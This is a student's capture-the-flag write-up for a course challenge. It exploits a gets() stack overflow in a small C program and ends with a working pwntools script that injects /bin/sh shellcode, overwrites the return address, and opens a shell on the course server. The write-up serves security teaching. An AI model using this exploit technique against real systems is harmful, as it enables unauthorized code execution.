# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "deprecated"
- story:  It's time for your first _real_ exploit! From man 3 gets: Never use this function.
- we have the following source code
```c
#include <stdio.h>

int main(void)
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    char me[16] = "Tim";
    printf("Hello! My name is %p!\n", me);

    char name[16];
    printf("What is your name? ");
    gets(name); // reads in put until \n = 0x0A

    printf("Hello %s!\n", name);
}
```
- idea: overflow buffer, add shellcode into buffer and override return address to point to our shell code
- use IDA Free to look at main function
```
-0000000000000020 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000020 // Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020
-0000000000000020     _BYTE var_20;
-000000000000001F     // padding byte
-000000000000001E     // padding byte
-000000000000001D     // padding byte
-000000000000001C     // padding byte
-000000000000001B     // padding byte
-000000000000001A     // padding byte
-0000000000000019     // padding byte
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     // padding byte
-0000000000000013     // padding byte
-0000000000000012     // padding byte
-0000000000000011     // padding byte
-0000000000000010     _QWORD var_10;
-0000000000000008     _QWORD var_8;
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```
- press F5 to see C-like code
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-20h] BYREF    <----- rbp - 32 is top of buffer :)
  _QWORD v5[2]; // [rsp+10h] [rbp-10h] BYREF  <----- we get this pointer: rbp - 16

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v5[0] = 7170388LL;
  v5[1] = 0LL;
  printf("Hello! My name is %p!\n", v5);
  printf("What is your name? ");
  gets(v4);
  printf("Hello %s!\n", v4);
  return 0;
}
```
- we can use the 32 Byte buffer + override saved RBP + the return address:
```
8Bytes          <---- RBP - 0x20 at the top of this
8Bytes
8Bytes          <---- we get pointer to top of this
8Bytes
saved RBP       <---- RPB points to top of this 
return adddress
```
- check security features
    ```
    checksec --file=vuln
    ```
    - outputs:
    ```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    ```
    - that means we can exeucte stack
- the folling script automatically exploits it (uncomment gdb thing to we able to debug):
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 32942)

# spawn binary and a gdb instance for debugging
# this way we can use pwntools to transfer bytes 
"""
conn = pwn.process('./vuln')
pwn.gdb.attach(conn)
"""

# shellcode from the slides
shellcode = pwn.asm('''
    mov rsp, rbp; # we need to move the rsp as well sothat stack well build
    xor rax, rax;
    mov al, 59;
    lea rdi, [rip + sh];
    xor rsi, rsi;
    xor rdx, rdx;
    syscall;
sh:
    .string "/bin/sh"
    nop
''')

# print shellcode to make sure that 32 byte (or add padding)
"""
print(f'shellcode: {shellcode.hex()}')
"""

conn.recvuntil(b'Hello! My name is 0x')
address = conn.recvuntil(b'!\nWhat is your name?', drop=True)
address_RIP = int(address.decode('utf-8'), 16)
# we need top of buffer, but get middle of big 32 byte buffer (two 16 byte buffers in C)
address_RIP -= 16
# we set RBP = RIP, because we have no data on stack for our shellcode
address_RBP = address_RIP
payload = shellcode + pwn.p64(address_RBP) + pwn.p64(address_RIP)
print(payload.hex())
# send shellcode
conn.sendline(payload)
# start interactive session (we have a shell now)
conn.interactive()
```
- flag:
```
softsec{pOPDs2lJJIOX79o9DB3opTbCpkmMbqpDg7T_JHb3FwrHzwryUorEaW3vGTlLMGQ9}
```